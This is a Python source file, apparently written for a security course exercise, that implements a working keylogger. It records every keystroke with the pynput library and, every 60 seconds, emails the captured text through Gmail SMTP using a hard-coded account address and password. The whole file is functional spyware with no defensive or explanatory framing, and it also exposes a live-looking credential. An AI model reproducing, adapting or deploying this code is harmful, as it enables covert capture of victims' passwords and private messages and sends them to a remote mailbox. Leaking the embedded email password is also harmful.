import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener

# Global variables
log_data = ""  # String builder for storing logs
email_interval = 60  # Time in seconds to send logs
email_address = "practice.email.cs450@gmail.com"
email_password = "dimeqmbctsigedfh"
recipient_email = "practice.email.cs450@gmail.com"


# Keylogger functionality
def write_to_memory(key):
    global log_data
    key = str(key).replace("'", "")  # Remove quotes
    if key == "Key.space":
        log_data += " "
    elif key == "Key.enter":
        log_data += "\n"
    elif key.startswith("Key."):
        log_data += f"[{key}]"  # For special keys like shift, ctrl
    else:
        log_data += key

def on_press(key):
    write_to_memory(key)

# Email logs
def send_email():
    global log_data
    if log_data.strip():  # Only send if there's data
        try:
            # Create the email
            msg = MIMEMultipart()
            msg['From'] = email_address
            msg['To'] = recipient_email
            msg['Subject'] = "Keylogger Logs"
            msg.attach(MIMEText(log_data, "plain"))

            # Send the email
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(email_address, email_password)
                server.sendmail(email_address, recipient_email, msg.as_string())

            # Clear the logs after sending
            log_data = ""
        except Exception as e:
            print(f"Error sending email: {e}")

# Schedule email sending
def schedule_email():
    import threading
    threading.Timer(email_interval, schedule_email).start()
    send_email()

# Start keylogger
def start_keylogger():
    schedule_email()  # Start email schedule
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
